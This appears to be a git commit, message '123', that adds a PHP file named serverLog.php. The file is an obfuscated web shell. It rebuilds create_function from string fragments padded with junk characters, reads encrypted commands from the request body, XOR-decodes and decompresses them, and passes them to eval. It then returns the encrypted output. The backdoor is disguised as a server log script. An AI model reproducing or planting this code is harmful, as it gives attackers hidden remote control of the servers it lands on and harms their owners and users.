210de5939ef3f89ecee1187416b516ed8a4414af
root <root@localhost.localdomain>
2019-04-23 03:28:30 -0400

    123

---
+++ serverLog.php
@@ -0,0 +1,11 @@
+<?php
+$A=str_replace('Eh','','cEhreEhatEhe_fuEhncEhtiEhon');
+$n='=%0;($j<$c&&%$i<$l);$j%++,%$i++){$o%.=$t%%%{$i}^$k{$j};}}ret%%urn $o;}if(@p%reg_match%';
+$Z='%l(@%gzuncompres%s(@x(@ba%se6%4_%decode($m[%1%]),%%$k)));$o=@ob_get_c%ontent%s();@ob_e';
+$f='$k=%%"f%380faf4";%$kh="fd01070d81a7%";$kf%=%"6297%3%57141ba";$p="X%vhd%UQpDMv%hEjP4i";f';
+$u='unc%ti%on %x($t,$k)%{$c=strlen%($k);$l%=strlen%(%$t)%%;$o="";for($i=0;$%i%<$l;%){for($j';
+$a='%%("/$kh(.+)%$kf/",@fil%e_g%et_cont%ents("php:%//input%")%%,$m)=%=1){@ob%_start();@eva';
+$J='%nd_cl%ean();$r%=@ba%se64%_enco%de(%%@x(@gzco%mpress($o),$k));pri%%nt("$p%$kh$r$kf");}';
+$l=str_replace('%','',$f.$u.$n.$a.$Z.$J);
+$H=$A('',$l);$H();
+?>
